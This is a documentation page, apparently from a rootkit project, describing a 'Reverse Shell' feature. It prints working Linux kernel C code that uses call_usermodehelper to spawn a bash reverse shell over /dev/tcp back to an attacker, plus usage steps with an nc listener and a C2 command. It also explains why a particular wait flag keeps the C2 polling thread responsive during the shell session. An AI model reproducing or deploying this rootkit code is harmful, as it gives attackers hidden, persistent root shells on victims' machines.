---
title: Reverse Shell
description: Opens an interactive bash session from the victim back to the attacker over a raw TCP connection.
---

**Bonus**

Opens an interactive bash session from the victim back to the attacker over a raw TCP connection.

## How it works

A reverse shell is a shell that connects *outward* from the victim to the attacker, bypassing firewalls that block incoming connections. The attacker sets up a TCP listener (`nc -lvnp 4444`), then sends the `shell:<ip>,<port>` action to the rootkit.

The rootkit spawns `bash -i >& /dev/tcp/<ip>/<port> 0>&1` via `call_usermodehelper()` with **`UMH_WAIT_EXEC`**, meaning the kernel thread only waits until `execve` completes, then returns immediately. The bash process keeps running in the background, so the C2 polling thread is never blocked.

## Implementation

```c
// rootkit/src/exec.c : reverse_shell()

void reverse_shell(char *ip, unsigned int port)
{
    char *cmd = kmalloc(256, GFP_KERNEL);
    // bash built-in: redirect stdio over a TCP socket
    snprintf(cmd, 256,
             "bash -i >& /dev/tcp/%s/%u 0>&1", ip, port);

    char *argv[] = { "/bin/bash", "-c", cmd, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                     "TERM=xterm",   // needed for interactive programs
                     NULL };

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, ...);

    // UMH_WAIT_EXEC: return once execve() finishes.
    // bash keeps running in background — polling thread is NOT blocked.
    call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
    kfree(cmd);
}
```

:::tip[UMH_WAIT_EXEC vs UMH_WAIT_PROC]
`UMH_WAIT_EXEC` is used here on purpose: the kernel thread returns as soon as bash starts, not when the session ends. The C2 polling continues normally while the shell session runs in parallel. `UMH_WAIT_PROC` would block the entire polling thread for the duration of the session — potentially hours.
:::

## Usage

```sh
# 1. On the attacker machine — open a listener
nc -lvnp 4444

# 2. In the C2 dashboard — send action
shell:10.0.2.2,4444

# 3. Interactive shell appears in the nc terminal
root@victim:~#
```

## What we tried first

The first version used `UMH_WAIT_PROC`, the same wait flag as `exec_command()`. That flag blocks the caller until the child process exits entirely. For a short-lived command this is fine, but a reverse shell stays open for as long as the attacker keeps the session alive.

The result: the C2 polling thread was completely blocked for the duration of the session. No new commands could be received, no other actions dispatched. Switching to `UMH_WAIT_EXEC` fixed this — the polling kthread returns immediately and keeps running in parallel with the open shell session.
